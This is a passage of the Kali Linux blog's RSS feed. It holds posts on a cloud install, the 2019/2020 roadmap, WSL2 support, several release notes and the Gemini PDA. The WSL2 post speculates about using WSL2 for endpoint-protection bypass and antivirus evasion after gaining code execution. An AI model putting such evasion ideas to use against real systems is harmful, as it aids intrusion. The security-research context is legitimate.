<pre><code class="language-console">user@computer:~$ ssh -i MY_KEY root@192.168.1.1 The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established. ECDSA key fingerprint is SHA256:d83fcd43d25e2a7edd291666160b47360cc85870ded. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'IP' (ECDSA) to the list of known hosts. Linux kali-s-1vcpu-1gb-nyc3-01 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-2kali1 (2019-05-15) x86_64 The programs included with the Kali GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. </code></pre> <p>Now we have a nice, minimal Kali Linux installation that we can deploy and customize as needed:</p> <pre><code class="language-console">root@kali-s-1vcpu-1gb-nyc3-01:~# lsb_release -a No LSB modules are available. Distributor ID: Kali Description: Kali GNU/Linux Rolling Release: 2019.2 Codename: n/a root@kali-s-1vcpu-1gb-nyc3-01:~# uname -a Linux kali-s-1vcpu-1gb-nyc3-01 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-2kali1 (2019-05-15) x86_64 GNU/Linux root@kali-s-1vcpu-1gb-lon1-01:~# free -h total used free shared buff/cache available Mem: 987Mi 51Mi 527Mi 1.0Mi 407Mi 790Mi Swap: 0B 0B 0B </code></pre></description>
</item>
<item>
<title>Kali Linux Roadmap (2019/2020)</title>
<link>https://www.kali.org/blog/kali-linux-roadmap-2019-2020/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-roadmap-2019-2020/</guid>
<pubDate>Wed, 19 Jun 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/images/kali-roadmap-2019-2020.jpg" type="image/jpg"/>
<description><p>Now that our 2019.2 release is out, we thought we would take this opportunity to cover some of the changes and new features we have coming to Kali Linux in the following year. Normally, we only really announce things when they are ready to go public, but a number of these changes are going to impact users pretty extensively so we wanted to share them early.</p> <p>As you read through this post, what you will see is that we are really trying to balance our efforts between changes that are user facing and those that are applicable to the backend. The backend changes don&rsquo;t seem as exciting at first, but the fact is that the easier it is for us to work on Kali, the easier it is for us to get to user facing features. Plus, some of these changes are focused on tweaking the development process to make it easier for others to get involved in the project.</p> <p>We are not ready to announce dates on any of these changes just yet. When they are ready, they will drop.</p> <h3 id="gitlab---the-new-home-for-kali-packages">GitLab - The New Home for Kali Packages</h3> <p>One of the biggest changes, which you may have already noticed, is our move of the Official Kali git repository to <a href="https://gitlab.com/kalilinux">GitLab</a>. With this change, it&rsquo;s easier than ever for the community to submit improvements to Kali packages and for us to apply them! We expect to make an heavy use of the GitLab Continous Integration features to streamline our work on packages and to provide automated feedback to all the contributors submitting merge requests.</p> <p>Documentation is coming soon on how to contribute packages. Expect a full guide to be published in <a href="https://www.kali.org/docs/">our docs</a> later.</p> <h3 id="runtime-tests---finding-bugs-before-users">Runtime Tests - Finding Bugs Before Users</h3> <p>Speaking of packages, the detection of bugs and problems with the packages is always something to improve. Until now, we have relied on manual testing on our part and <a href="https://bugs.kali.org/">user-provided bug reports</a>. This works ok, as popular packages would never stay broken for long but some edge packages could break for months at a time before anyone would notice and actually report it to us. (Let&rsquo;s be honest, most of the time when you find something broken in Kali, you don&rsquo;t create a bug report do you?)</p> <p>To improve this situation, we have recently deployed <a href="https://salsa.debian.org/ci-team/debci">debci</a> on <a href="https://autopkgtest.kali.org/">autopkgtest.kali.org</a>. This allows us to have our own continuous integration system, allowing for automated testing of Kali packages on a regular basis. We have integrated the result of those tests in the <a href="https://pkg.kali.org/teams/kali-developers/">Kali Package Tracker</a>.</p> <p>For this infrastructure to be as useful as it can be, we will need to have <a href="https://salsa.debian.org/ci-team/autopkgtest/raw/master/doc/README.package-tests.rst">runtime tests</a> on all our packages, which is still a long way off. Hopefully, this will be a place where we <strong>get community help to speed up the process</strong>, so feel free to submit <a href="https://gitlab.com/kalilinux/packages">merge requests</a> adding tests!</p> <h3 id="metapackages---what-is-installed-by-default">Metapackages - What is Installed by Default</h3> <p>One of the biggest challenges with running a project like Kali Linux is balance. We now have so many users that there&rsquo;s no longer &ldquo;one right size&rdquo;. Traditionally, what people have asked for is &ldquo;all the tools, all the time&rdquo;. But as time has gone by, this has led to one of the largest (pun fully intended) issues with Kali: Bloat. Too many packages making too big of a distribution, large ISO sizes, etc. etc.</p> <p>To address this, we are giving our metapackages a refresh. This change includes the default Kali metapackage, &ldquo;kali-linux-full&rdquo;, the metapackage that controls what packages are installed on Kali by default. Needless to say, this is a big user-facing change that will impact everyone. Tools that we decide to drop are most often older tools that don&rsquo;t have a lot of modern utility, have not been updated in years, or have been supplanted by newer better tools.</p> <p>What this means is that by default, some of the tools you may have relied upon may no longer be included by default. These tools will still exist in the repo, so you can install them manually or use a metapackage that contains them. You can see full documentation of the metapackages and what they contain at <a href="https://www.kali.org/docs/general-use/metapackages/">kali.org/docs/general-use/metapackages/</a></p> <p>Before these changes go live, we will do another blog post detailing them. Expect that these metapackages will be in flux for a bit as we continue to optimize.</p> <h3 id="default-shell---your-primary-kali-interface">Default Shell - Your Primary Kali Interface</h3> <p>The shell in Kali is likely the most used utility in the entire distribution for the majority of users. This creates a bit of a schizophrenic challenge in that it&rsquo;s used so much we want to improve it, but at the same time we have to make sure it does not break.</p> <p>To address this, we will be adding default installations of <a href="https://en.wikipedia.org/wiki/Z_shell">ZSH</a> and <a href="https://en.wikipedia.org/wiki/Friendly_interactive_shell">FISH</a> to Kali. Each of these shells are optimized for penetration testers, which is sort of fun. Most of the time when you look at shell optimization, all the text is focused on developers, which is not where Kali sits. Our goal here is to have the best, most optimized, shell environment for penetration testers.</p> <p>At the same time, good old Bash won&rsquo;t go away and we are going to leave it as the default for now. Those of you that want to be adventurous and try the new shells will find easy ways to switch. Those of you that just want to stick with Bash will still be able to. Expect in-shell instructions (and a blog post) when this change is rolled out.</p> <h3 id="documentation---read-the-fine-manual">Documentation - Read The Fine Manual</h3> <p>Expect some changes to <a href="https://www.kali.org/docs/"><strong>kali.org/docs/</strong></a> and <a href="https://www.kali.org/tools/"><strong>kali.org/tools/</strong></a>, along with an integration of the Kali manual into git via markdown. This will allow for user submitted documentation to help us keep instructions up to date and accurate. This is another great way for you to contribute to the Kali Linux project.</p> <h3 id="nethunter---new-blood">NetHunter - New Blood</h3> <p>As you may have noticed on Twitter and git commits, we have got another developer on board, &ldquo;<a href="https://twitter.com/Re4sonKernel">@Re4son</a>&rdquo;, and he has put the <a href="https://www.kali.org/get-kali/#kali-mobile">NetHunter</a> project into overdrive. He is working on supporting new hardware, working with the latest version of Android, and various bug fixes.</p> <p>There is also &ldquo;<strong>Project Redback</strong>&rdquo;, but that is all we are going to say about that for the time being&hellip;more about this in a blog post very soon.</p> <h3 id="what-else-can-we-expect">What Else can we Expect?</h3> <p>This is just the portion of the roadmap that makes sense to talk about now. There is a lot more in development that we are just not ready to talk about yet.</p> <p>We also would like to welcome <a href="https://twitter.com/g0tmi1k">@g0tmi1k</a> who has switched over from <a href="https://www.offsec.com/">OffSec</a> as a full time core <a href="https://www.kali.org/about-us/">Kali developer</a>.</p> <p>We are at a really exciting stage of the Kali development process, where a lot of the behind the scenes items we have been working on are getting ready to go public. Expect a fair amount of improvements in Kali Linux over the next half of the year. If you want to discuss this post with us or have ideas on things that we might consider, please get in touch via <a href="https://forums.kali.org/showthread.php?44470-Kali-Linux-Roadmap-(2019-2020)&amp;p=86334#post86334">the forum</a>.</p></description>
</item>
<item>
<title>WSL2 and Kali</title>
<link>https://www.kali.org/blog/wsl2-and-kali/</link>
<guid isPermaLink="true">https://www.kali.org/blog/wsl2-and-kali/</guid>
<pubDate>Thu, 13 Jun 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/wsl2-and-kali/images/wsl2-and-kali.jpg" type="image/jpg"/>
<description><p>Kali Linux has had support for WSL for <a href="https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/">some time</a>, but its usefulness has been somewhat limited. This was mostly due to restrictions placed on some system calls , most importantly those revolving <a href="https://github.com/microsoft/WSL/issues/1349">around networking</a>. Furthermore, additional issues with speed, specifically I/O, were also problematic. Because of this, Kali WSL has mostly been relegated to reporting functions after an assessment is completed. A cool technology, and certainly an amazing engineering feat, but as is, it just was not that useful in the field.</p> <p>When <a href="https://devblogs.microsoft.com/commandline/announcing-wsl-2/">WSL 2 was announced</a> however, we were excited about what this could mean for actually making Kali WSL more useful in. As such, when we saw that WSL 2 was available in the <a href="https://devblogs.microsoft.com/commandline/wsl-2-is-now-available-in-windows-insiders/">Windows Insiders program</a> we wanted to jump right on it and see what improvements were made.</p> <h3 id="wsl2-conversion">WSL2 Conversion</h3> <p>After you have the new Windows Insider build installed, converting Kali WSL 1 to 2 is very easy.</p> <p><p> <a href='https://www.kali.org/blog/wsl2-and-kali/images/conversion-cropped.png'> <img src="https://www.kali.org/blog/wsl2-and-kali/images/conversion-cropped.png" alt="" /> </a> </p> </p> <p>This was a great surprise for us, as it also means we don&rsquo;t have to do anything on our end to support WSL2. Kali&rsquo;s current WSL distribution will work just fine, and you can convert your existing installation easily. According to <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-index">the docs</a> you can also set WSL2 as your default if you don&rsquo;t have a Kali installed yet.</p> <p>Overall, this was a great surprise, and means Kali is ready for WSL 2 today.</p> <h3 id="kali-wsl-2-usage">Kali WSL 2 Usage</h3> <p>Ok, so WSL 2 works with Kali, but is it useful? We are just starting to play with WSL 2, so it&rsquo;s really too early to say. However there are a few quick observations we have.</p> <p>Basic usage, such as updating Kali and installing packages, appears to work just fine.</p> <p><p> <a href='https://www.kali.org/blog/wsl2-and-kali/images/kali-update-cropped.png'> <img src="https://www.kali.org/blog/wsl2-and-kali/images/kali-update-cropped.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/wsl2-and-kali/images/nmap1.png'> <img src="https://www.kali.org/blog/wsl2-and-kali/images/nmap1.png" alt="" /> </a> </p> </p> <p>However, simply installing something is not that interesting, The question is: does it work? One specific tool we wanted to immediately check was Nmap, which has always been a WSL pain point. As you can see from the screenshot, a basic Nmap scan works right out of the box! Thats great news and is very promising for WSL 2 as it continues development.</p> <p><p> <a href='https://www.kali.org/blog/wsl2-and-kali/images/nmap-run.png'> <img src="https://www.kali.org/blog/wsl2-and-kali/images/nmap-run.png" alt="" /> </a> </p> </p> <p>That should not be a great surprise however, as WSL 2 at its core is really a low overhead and optimized VM. This has brought about some changes for those of us who have been using WSL for a while. These changes fall mostly along the lines of process spaces, networking, and filesystem interaction. This brings up some items we will have to watch as WSL continues to mature.</p> <h4 id="all-networking-appears-to-be-nated-in-the-current-release">All networking appears to be NATed in the current release.</h4> <p>Microsoft states:</p> <blockquote> <p>In the initial builds of the WSL 2 preview, you will need to access any Linux server from Windows using the IP address of your Linux distro, and any Windows server from Linux using the IP address of your host machine. This is something that is temporary, and very high on our priority list to fix.</p> </blockquote> <p>So, no bridged mode. Anyone who uses Kali in a VM knows that for an actual assessment work it&rsquo;s always better to run Kali in bridged mode, not NAT. With the current release, reverse shells are really not going to be an easy option without playing around with port forwarding on the Windows side. Additionally, we don&rsquo;t yet know the strength of the NAT engine. While scans ran through WSL2 are now possible, their results will remain questionable until we find how much the NAT engine impacts them.</p> <h4 id="as-it-is-in-a-vm-the-process-space-is-separate">As it is in a VM, the process space is separate.</h4> <p>This is interesting, as it might actually open up Kali WSL 2 to be a useful endpoint protection bypass. If you get code execution on a Windows 10 system that supports WSL 2, could you install a Kali instance and pivot from there instead of the base operating system? This remains to be seen as this is still in development and Microsoft seems to want to unify the Linux and Windows experience as much as possible. The end point protection programs might become &ldquo;WSL Aware&rdquo;, which makes this is an interesting item to watch.</p> <h4 id="wsl-2s-filesystem-is-now-in-a-virtual-disk">WSL 2&rsquo;s filesystem is now in a virtual disk.</h4> <p>Similar to traditional VMs, there is now a virtual disk that holds the WSL 2 instance. In the past, one of the WSL issues that would come up is that many Kali tools would trigger anti-virus protections. To keep Kali WSL useful you would have to make exclusions for the location in which the Kali files were saved on the Windows filesystem.</p> <p>Now that it&rsquo;s in a virtual disk, much like the process space isolation, it will remain to be seen how AV might deal with it. Currently, it appears that AV ignores this virtual disk and its contents but as WSL reaches general availability it is possible AV products will become WSL 2 aware. Again, something we will need to watch.</p> <h3 id="overall">Overall</h3> <p>As it stands, WSL 2 is an exciting technology and most definitely worth paying attention to. This is the first public beta and a lot will change over time. As such, we will track its development and see what we can do to make WSL 2 more useful for our purposes. As it stands however, it already seems more useful than what we have experienced with WSL 1 for actual production use. However, WSL 1 is still supported on a WSL 2 system so if you are a WSL user you can pick what&rsquo;s best for you.</p></description>
</item>
<item>
<title>Kali Linux 2019.2 Release</title>
<link>https://www.kali.org/blog/kali-linux-2019-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2019-2-release/</guid>
<pubDate>Tue, 21 May 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2019-2-release/images/kali-release-2019.jpg" type="image/jpg"/>
<description><p>Welcome to our second release of 2019, Kali Linux 2019.2, which is available for immediate <a href="https://www.kali.org/get-kali/">download</a>. This release brings our kernel up to version 4.19.28, fixes numerous bugs, includes many updated packages, and most excitingly, features a new release of Kali NetHunter!</p> <h3 id="kali-nethunter-20192-release">Kali NetHunter 2019.2 Release</h3> <p>Thanks to the tireless contributions from the vibrant NetHunter community led by @Re4son, @binkybear, @fattire, @jmingov, @jcadduono, @Kimocoder, and @PaulWebSec, NetHunter now supports over 50 devices running all the latest Android versions, from KitKat through to Pie. To celebrate this milestone, we have released <strong>13</strong> new NetHunter images for the latest Android versions of our favourite devices, including:</p> <ul> <li>Nexus 6 running Pie</li> <li>Nexus 6P, Oreo</li> <li>OnePlus2, Pie</li> <li>Galaxy Tab S4 LTE &amp; WiFi, Oreo</li> </ul> <p>These and many more can be downloaded from our <a href="https://www.kali.org/get-kali/#kali-mobile">NetHunter</a> page. If you cannot find an image for your favourite device and you are interested in porting NetHunter, we would love for you to join our community and give it a crack. More information can be found at our new home on <a href="https://www.kali.org/docs/nethunter/">kali-docs</a>.</p> <h3 id="tool-upgrades">Tool Upgrades</h3> <p>This release largely features various tweaks and bug fixes but there are still many updated tools including <a href="https://pkg.kali.org/pkg/seclists">seclists</a>, <a href="https://pkg.kali.org/pkg/msfpc">msfpc</a>, and <a href="https://pkg.kali.org/pkg/exe2hexbat">exe2hex</a>.</p> <p>For the complete list of updates, fixes, and additions, please refer to the <a href="https://bugs.kali.org/changelog_page.php">Kali Bug Tracker Changelog</a>.</p> <h3 id="arm-updates">ARM Updates</h3> <p>For our ARM users, be aware that the first boot will take a bit longer than usual, as it requires the reinstallation of a few packages on the hardware. This manifests as the login manager crashing a few times until the packages finish reinstalling and is expected behaviour.</p> <h3 id="download-kali-linux-20192">Download Kali Linux 2019.2</h3> <p>If you would like to check out this latest and greatest Kali release, you can find download links for ISOs and Torrents on the <a href="https://www.kali.org/get-kali/">Kali Downloads</a> page along with links to the <a href="https://www.kali.org/get-kali/#kali-vm">OffSec virtual machine and ARM images</a>, which have also been updated to 2019.2. If you already have a Kali installation you&rsquo;re happy with, you can easily upgrade in place as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y full-upgrade </code></pre> <h4 id="ensuring-your-installation-is-updated">Ensuring your Installation is Updated</h4> <p>To double check your version, first make sure your Kali <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">package repositories</a> are correct:</p> <pre><code class="language-console">root@kali:~# cat /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free </code></pre> <p>Then after running &lsquo;apt -y full-upgrade&rsquo;, you may require a &lsquo;reboot&rsquo; before checking:</p> <pre><code class="language-console">root@kali:~# grep VERSION /etc/os-release VERSION=&quot;2019.2&quot; VERSION_ID=&quot;2019.2&quot; root@kali:~# uname -a Linux kali 4.19.0-kali4-amd64 #1 SMP Debian 4.19.28-2kali1 (2019-03-18) x86_64 GNU/Linux </code></pre> <p>If you come across any bugs in Kali, please open a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We&rsquo;ll never be able to fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Kali Linux 2019.1 Release</title>
<link>https://www.kali.org/blog/kali-linux-2019-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2019-1-release/</guid>
<pubDate>Mon, 18 Feb 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2019-1-release/images/kali-release-2019.jpg" type="image/jpg"/>
<description><p>Welcome to our first release of 2019, Kali Linux 2019.1, which is available for immediate <a href="https://www.kali.org/get-kali/">download</a>. This release brings our kernel up to version 4.19.13, fixes numerous bugs, and includes many updated packages.</p> <h3 id="tool-upgrades">Tool Upgrades</h3> <p>The big marquee update of this release is the update of Metasploit to version 5.0, which is their first major release since version 4.0 came out in 2011:</p> <pre><code class="language-console">root@kali:~# msfconsole , , / \ ((__---,,,---__)) (_) O O (_)_________ \ _ / |\ o_o \ M S F | \ \ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.2-dev ] + -- --=[ 1852 exploits - 1046 auxiliary - 325 post ] + -- --=[ 541 payloads - 44 encoders - 10 nops ] + -- --=[ 2 evasion ] + -- --=[ ** This is Metasploit 5 development branch ** ] msf5 &gt; </code></pre> <p><a href="https://blog.rapid7.com/2019/01/10/metasploit-framework-5-0-released/">Metasploit 5.0</a> is a massive update that includes <a href="https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service">database and automation APIs</a>, <a href="https://www.rapid7.com/info/encapsulating-antivirus-av-evasion-techniques-in-metasploit-framework/">new evasion capabilities</a>, and usability improvements throughout. Check out their in-progress <a href="https://github.com/rapid7/metasploit-framework/wiki/Metasploit-5.0-Release-Notes">release notes</a> to learn about all the new goodness</p> <p>Kali Linux 2019.1 also includes updated packages for <a href="https://www.kali.org/tools/theharvester/">theHarvester</a>, <a href="https://pkg.kali.org/pkg/dbeaver">DBeaver</a>, and more. For the complete list of updates, fixes, and additions, please refer to the <a href="https://bugs.kali.org/changelog_page.php">Kali Bug Tracker Changelog</a>.</p> <h3 id="arm-updates">ARM Updates</h3> <p>The 2019.1 Kali release for ARM includes the return of Banana Pi and Banana Pro, both of which are on the 4.19 kernel. Veyron has been moved to a 4.19 kernel and the Raspberry Pi images have been simplified so it is easier to figure out which one to use. There are no longer separate Raspberry Pi images for users with TFT LCDs because we now include @Re4son&rsquo;s <strong>kalipi-tft-config</strong> script on all of them, so if you want to set up a board with a TFT, run &lsquo;kalipi-tft-config&rsquo; and follow the prompts.</p> <h3 id="download-kali-linux-20191">Download Kali Linux 2019.1</h3> <p>If you would like to check out this latest and greatest Kali release, you can find download links for ISOs and Torrents on the <a href="https://www.kali.org/get-kali/">Kali Downloads</a> page along with links to the <a href="https://www.kali.org/get-kali/#kali-vm">OffSec virtual machine and ARM images</a>, which have also been updated to 2019.1. If you already have a Kali installation you&rsquo;re happy with, you can easily upgrade in place as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y full-upgrade </code></pre> <h4 id="ensuring-your-installation-is-updated">Ensuring your Installation is Updated</h4> <p>To double check your version, first make sure your Kali <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">package repositories</a> are correct:</p> <pre><code class="language-console">root@kali:~# cat /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free </code></pre> <p>Then after running &lsquo;apt -y full-upgrade&rsquo;, you may require a &lsquo;reboot&rsquo; before checking:</p> <pre><code class="language-console">root@kali:~# grep VERSION /etc/os-release VERSION=&quot;2019.1&quot; VERSION_ID=&quot;2019.1&quot; root@kali:~# root@kali:~# uname -a Linux kali 4.19.0-kali1-amd64 #1 SMP Debian 4.19.13-1kali1 (2019-01-03) x86_64 GNU/Linux </code></pre> <p>If you come across any bugs in Kali, please open a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We&rsquo;ll never be able to fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Kali Linux for the Gemini PDA</title>
<link>https://www.kali.org/blog/kali-linux-for-the-gemini-pda/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-for-the-gemini-pda/</guid>
<pubDate>Tue, 04 Dec 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/kali-gem-pda-post-alternative.jpg" type="image/jpg"/>
<description><h2 id="running-kali-on-a-gem">Running Kali on a Gem</h2> <p>The <a href="https://planetcom.squarespace.com/device/">Gemini PDA</a> from Planet Computers is an ultra-thin, clamshell mobile device with a tactile keyboard. Sporting a 5.99&quot; screen, QWERTY keyboard, 4G &amp; Wi-Fi, deca-core CPU, and an Open-source bootloader that supports multi-boot, it caught our attention straight away when it popped up on Indiegogo. It is a great little pocket rocket and having a landscape orientation and hardware keyboard, is well suited for a native Kali installation with a full <a href="https://lxqt.org/">LXQT</a> desktop environment.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/01-gem.png'> <img src="https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/01-gem.png" alt="" /> </a> </p> </p> <h3 id="hardware-specs">Hardware Specs</h3> <ul> <li>MediaTek Deca Core Helio, with either X25 or X27 chipset</li> <li>CPU: 2x Cortex A72 @2.6GHz, 4x Cortex A53 @2.0GHz, 4x Cortex A53 @1.6GHz</li> <li>GPU: ARM Mali T880 MP4 @875MHz</li> <li>RAM: 4GB</li> <li>Flash: 64GB plus micro SD card support</li> </ul> <p>More: <a href="https://en.wikipedia.org/wiki/Gemini_(PDA)">en.wikipedia.org/wiki/Gemini_(PDA)</a></p> <h3 id="operating-systems">Operating Systems</h3> <p>Multiboot any one, two, or three of the following five operating systems: Android, rooted Android, Sailfish, Debian, Kali Linux. The image we provide on our download page includes the following two partitions:</p> <ol> <li>Android (rooted), 16 GB. To boot Android, just press and hold the &ldquo;On&rdquo; (Esc) key until it vibrates</li> <li>Kali Linux, 40 GB. To boot Kali, press and hold the &ldquo;On&rdquo; (Esc) key until it vibrates and then quickly press the silver &ldquo;Voice Assist&rdquo; button on the right hand side of the device</li> </ol> <h3 id="kernel">Kernel</h3> <p>Our Gemini image contains a Kali Linux fork of the Gemini-Android kernel 3.18 with injection support for all your favourite Wi-Fi chips.</p> <h3 id="desktop-environment">Desktop Environment</h3> <p>LXQT with SDDM is lightweight, provides great scaling for tiny screens, has good touch support, and a slick modern layout. Whilst using the tiny touchscreen looks a bit intimidating initially, it is surprisingly finger friendly. We don&rsquo;t bother using a mouse anymore with this device.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/02-gem.png'> <img src="https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/02-gem.png" alt="" /> </a> </p> </p> <h3 id="linux--android-integration">Linux / Android integration</h3> <p>Being basically a pimped up cell phone requires a convergence of Linux (glibc) and Android (bionic) to drive the hardware not yet natively supported by GNU/Linux. We are using components from the <a href="https://halium.org/">Halium project</a> to achieve that.</p> <p>Bringing GNU/Linux to the Gemini PDA, or any other mobile platform, is in the very early stages and some of it still needs a bit of work, such as data and voice support, GPS, power management, etc. There is currently one known issue with the Gemini having occasional issues when shutting down. The community is currently working on it.</p> <p>Overall, it&rsquo;s a very stable experience thanks to the hard work of the <a href="https://sailfishos.org/">Sailfish</a> and <a href="https://github.com/gemian/gemini-keyboard-apps/wiki">Gemian</a> communities, in particular TheKit and adam_b, who brought Gemian to the Gemini PDA and helped a lot with this project.</p> <h3 id="installation">Installation</h3> <p>We have published a <a href="https://www.kali.org/docs/arm/gemini-pda/">Gemini installation guide</a> on our documentation site to get you up and running quickly.</p> <h3 id="support">Support</h3> <p>Linux on the Gemini PDA is very experimental with limited manufacturer support and some hardware is not natively supported by Linux, requiring some community hacks. OffSec does not provide technical support for the Gemini. Support for Kali on the Gemini can be obtained via various methods listed on the <a href="https://www.kali.org/community/">Kali Linux Community</a> page.</p> <h3 id="wrapping-up">Wrapping Up</h3> <p>The Gemini PDA is a nifty little powerhouse that combines the charm and handling of the good old Psion series with the power of a modern ARM64, making it the ideal mobile platform for a desktop version of Kali Linux with touch support.</p> <p>With the community demand for Kali Linux on the Gemini and considering that the manufacturer has just launched a new crowd funding campaign for another device, having a Kali platform for this particular hardware segment is setting us up for exciting times ahead.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/03-gem.png'> <img src="https://www.kali.org/blog/kali-linux-for-the-gemini-pda/images/03-gem.png" alt="" /> </a> </p> </p></description>
</item>
<item>
<title>Kali Linux 2018.4 Release</title>
<link>https://www.kali.org/blog/kali-linux-2018-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2018-4-release/</guid>
<pubDate>Mon, 29 Oct 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2018-4-release/images/kali-release.jpg" type="image/jpg"/>
<description><p>Welcome to our fourth and final release of 2018, Kali Linux 2018.4, which is available for immediate <a href="https://www.kali.org/get-kali/">download</a>. This release brings our kernel up to version 4.18.10, fixes numerous bugs, includes many updated packages, and a <strong>very experimental</strong> 64-bit Raspberry Pi 3 image.</p> <h3 id="new-tools-and-tool-upgrades">New Tools and Tool Upgrades</h3> <p>We have only added one new tool to the distribution in this release cycle but it&rsquo;s a great one. <strong><a href="https://pkg.kali.org/pkg/wireguard">Wireguard</a></strong> is a powerful and easy to configure VPN solution that eliminates many of the headaches one typically encounters setting up VPNs. Check out our <a href="https://www.kali.org/blog/wireguard-on-kali/">Wireguard post</a> for more details on this great addition.</p> <p>Kali Linux 2018.4 also includes updated packages for <a href="https://www.kali.org/tools/burpsuite/">Burp Suite</a>, <a href="https://www.kali.org/tools/patator/">Patator</a>, <a href="https://www.kali.org/tools/gobuster/">Gobuster</a>, <a href="https://www.kali.org/tools/binwalk/">Binwalk</a>, <a href="https://www.kali.org/tools/python-faraday/">Faraday</a>, <a href="https://www.kali.org/tools/fern-wifi-cracker/">Fern-Wifi-Cracker</a>, <a href="https://www.kali.org/tools/rsmangler/">RSMangler</a>, <a href="https://www.kali.org/tools/theharvester/">theHarvester</a>, <a href="https://www.kali.org/tools/wpscan/">wpscan</a>, and more. For the complete list of updates, fixes, and additions, please refer to the <a href="https://bugs.kali.org/changelog_page.php">Kali Bug Tracker Changelog</a>.</p> <h3 id="64-bit-raspberry-pi-3">64-bit Raspberry Pi 3</h3> <p>We have created a very experimental Raspberry Pi 3 image that supports 64-bit mode. Please note that this is a beta image, so if you discover anything that isn&rsquo;t working, please alert us on our <a href="https://bugs.kali.org/">bug tracker</a>.</p> <h3 id="download-kali-linux-20184">Download Kali Linux 2018.4</h3> <p>If you would like to check out this latest and greatest Kali release, you can find download links for ISOs and Torrents on the <a href="https://www.kali.org/get-kali/">Kali Downloads</a> page along with links to the <a href="https://www.kali.org/get-kali/#kali-vm">OffSec virtual machine and ARM images</a>, which have also been updated to 2018.4. If you already have a Kali installation you&rsquo;re happy with, you can easily upgrade in place as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y full-upgrade </code></pre> <h4 id="ensuring-your-installation-is-updated">Ensuring your Installation is Updated</h4> <p>To double check your version, first make sure your Kali <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">package repositories</a> are correct:</p> <pre><code class="language-console">root@kali:~# cat /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free </code></pre> <p>Then after running &lsquo;apt -y full-upgrade&rsquo;, you may require a &lsquo;reboot&rsquo; before checking:</p> <pre><code class="language-console">root@kali:~# grep VERSION /etc/os-release VERSION=&quot;2018.4&quot; VERSION_ID=&quot;2018.4&quot; root@kali:~# root@kali:~# uname -a Linux kali 4.18.0-kali2-amd64 #1 SMP Debian 4.18.10-2kali1 (2018-10-09) x86_64 GNU/Linux </code></pre> <p>If you come across any bugs in Kali, please open a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We&rsquo;ll never be able to fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Announcing Kali for Vagrant</title>
<link>https://www.kali.org/blog/announcing-kali-for-vagrant/</link>
<guid isPermaLink="true">https://www.kali.org/blog/announcing-kali-for-vagrant/</guid>
<pubDate>Tue, 09 Oct 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/announcing-kali-for-vagrant/images/kali-on-vagrant.jpg" type="image/jpg"/>
